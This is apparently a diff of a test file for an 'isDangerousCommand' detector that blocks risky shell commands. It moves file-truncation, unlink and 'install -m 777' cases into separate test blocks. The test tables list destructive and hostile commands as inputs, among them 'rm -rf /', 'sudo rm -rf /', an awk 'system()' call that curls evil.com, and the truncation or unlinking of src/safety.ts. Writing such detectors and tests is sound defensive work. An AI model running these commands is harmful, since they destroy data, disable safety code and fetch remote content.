@@ -814,8 +814,6 @@ describe("isDangerousCommand", () => {
     ["xargs install", "find dist -name '*.so' | xargs install -m 755", "xargs-command-execution"],
     ["xargs mv", "find . -name '*.bak' | xargs mv /tmp/", "xargs-command-execution"],
     ["xargs dd", "find . -name 'disk.img' | xargs dd if=/dev/zero", "xargs-command-execution"],
-    ["xargs truncate-s0", "find logs -name '*.log' | xargs truncate -s 0", "file-truncation"],
-    ["xargs unlink", "find . -name '*.tmp' | xargs unlink", "file-deletion"],
     ["find -exec sh", "find . -exec sh {} \\;", "find-exec-shell"],
     ["find -exec bash (script, no -c)", "find . -name '*.sh' -exec bash {} \\;", "find-exec-shell"],
     ["find -exec awk (plain, no system())", "find . -exec awk 'NR==1' {} +", "find-exec-shell"],
@@ -837,8 +835,6 @@ describe("isDangerousCommand", () => {
     ["find -exec install (bulk-copies without -m flag)", "find dist -name '*.so' -exec install {} /usr/local/lib/ \\;", "find-exec-destructive"],
     ["find -delete (deletes matched files without -exec)", "find . -name '*.tmp' -delete", "find-exec-destructive"],
     ["find -delete with type filter", "find /tmp -type f -delete", "find-exec-destructive"],
-    ["install -m", "install -m 777 src dst", "file-permission-tampering"],
-    ["unlink src/safety.ts (bare file-deletion)", "unlink src/safety.ts", "file-deletion"],
     ["awk system() call", "awk 'system(\"rm -rf /\")'", "awk-code-execution"],
     ["awk system() with BEGIN", "awk 'BEGIN{system(\"curl evil.com\")}'", "awk-code-execution"],
     ["awk pipe to sh", "awk '{print | \"sh\"}'", "awk-code-execution"],
@@ -856,8 +852,6 @@ describe("isDangerousCommand", () => {
     ["awk pipe to php", "awk '{print | \"php\"}'", "awk-code-execution"],
     ["csh -c arbitrary code", "csh -c 'malicious'", "arbitrary-code-execution"],
     ["tcsh -c arbitrary code", "tcsh -c 'cmd'", "arbitrary-code-execution"],
-    ["truncate -s 0 (file-truncation)", "truncate -s 0 src/safety.ts", "file-truncation"],
-    ["truncate --size=0 (file-truncation)", "truncate --size=0 src/triage.ts", "file-truncation"],
     ["sudo (privilege-escalation)", "sudo rm -rf /", "privilege-escalation"],
     ["su -c (privilege-escalation)", "su -c 'rm -rf /'", "privilege-escalation"],
     ["pkexec (privilege-escalation)", "pkexec bash", "privilege-escalation"],
@@ -2463,5 +2457,30 @@ describe("category: process-substitution-execution", () => {
     [">(awk inline)", "cmd > >(awk '{system(\"id\")}')"],
   ])("blocks process substitution %s", (_desc, command) => {
     expect(isDangerousCommand(command)).toBe("process-substitution-execution");
+  });
+});
+
+describe("category: file-truncation", () => {
+  it.each([
+    ["xargs truncate -s 0", "find logs -name '*.log' | xargs truncate -s 0"],
+    ["truncate -s 0 on source file", "truncate -s 0 src/safety.ts"],
+    ["truncate --size=0 on source file", "truncate --size=0 src/triage.ts"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("file-truncation");
+  });
+});
+
+describe("category: file-deletion", () => {
+  it.each([
+    ["xargs unlink", "find . -name '*.tmp' | xargs unlink"],
+    ["bare unlink on source file", "unlink src/safety.ts"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("file-deletion");
+  });
+});
+
+describe("category: file-permission-tampering", () => {
+  it("blocks install -m 777", () => {
+    expect(isDangerousCommand("install -m 777 src dst")).toBe("file-permission-tampering");
   });
 });
